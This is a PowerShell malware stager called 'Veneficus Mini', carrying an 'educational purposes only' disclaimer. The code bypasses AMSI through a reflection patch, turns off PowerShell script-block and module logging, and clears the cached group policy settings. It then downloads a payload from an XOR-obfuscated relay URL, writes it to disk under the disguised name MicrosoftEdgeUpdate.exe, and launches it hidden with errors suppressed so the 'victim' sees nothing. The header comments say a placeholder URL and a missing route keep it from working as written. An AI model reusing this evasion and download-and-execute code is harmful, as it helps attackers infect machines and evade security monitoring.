<#
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
#>

# Veneficus Mini — PowerShell stager
# Generate RELAY_URL_B64_XOR with:
#   key = 0xAF
#   url = b"https://your-worker.workers.dev"
#   enc = base64.b64encode(bytes([b^key for b in url])).decode()
#
# Then replace YOUR_XOR_B64_URL below.
#
# Logic: decode Worker URL → AMSI/logging tweaks → GET $url/beacon →
# write %TEMP%\MicrosoftEdgeUpdate.exe → hidden Process.Start.
#
# BROKEN:
#   - Placeholder YOUR_XOR_B64_URL is not a valid URL; FromBase64String throws
#     unless replaced (caught by silent catch → no implant).
#   - Worker has no /beacon route (404 even with a real URL).
#   - AMSI amsiContext=IntPtr.Zero is a well-known, often-signatured trick.
#   - HKLM logging keys need admin; failure is ignored.

$e = "YOUR_XOR_B64_URL"
$k = 0xAF
$b = [System.Convert]::FromBase64String($e)
for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor $k }
$url = [System.Text.Encoding]::UTF8.GetString($b)

# ── AMSI bypass (in-process patch via reflection) ────────────────────────────
try {
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    $f = $a.GetField('amsiContext','NonPublic,Static')
    $f.SetValue($null, [IntPtr]::Zero)
} catch {}

# ── ScriptBlockLogging / ModuleLogging suppression ───────────────────────────
try {
    $r1 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
    $r2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
    if (-not (Test-Path $r1)) { New-Item -Path $r1 -Force | Out-Null }
    if (-not (Test-Path $r2)) { New-Item -Path $r2 -Force | Out-Null }
    Set-ItemProperty -Path $r1 -Name EnableScriptBlockLogging -Value 0 -Force
    Set-ItemProperty -Path $r2 -Name EnableModuleLogging      -Value 0 -Force
} catch {}

# ── Group policy cache clear (prevents logging re-enable) ────────────────────
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.Utils')
    $c = $t.GetField('cachedGroupPolicySettings','NonPublic,Static')
    if ($c) {
        $c.SetValue($null, @{
            'HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' =
                @{ 'EnableScriptBlockLogging' = 0 }
        })
    }
} catch {}

# ── Download and execute payload ──────────────────────────────────────────────
# GET $url/beacon — Worker in this tree returns 404 for that path.
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    $bytes = $wc.DownloadData("$url/beacon")

    # Write to a temp path with a benign-looking name.
    $tmp = [System.IO.Path]::Combine($env:TEMP, "MicrosoftEdgeUpdate.exe")
    [System.IO.File]::WriteAllBytes($tmp, $bytes)

    # Launch detached so the PowerShell window can close.
    $si = New-Object System.Diagnostics.ProcessStartInfo
    $si.FileName        = $tmp
    $si.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
    $si.CreateNoWindow  = $true
    $si.UseShellExecute = $false
    [System.Diagnostics.Process]::Start($si) | Out-Null
} catch {
    # Silent failure — no visible error to the victim.
}
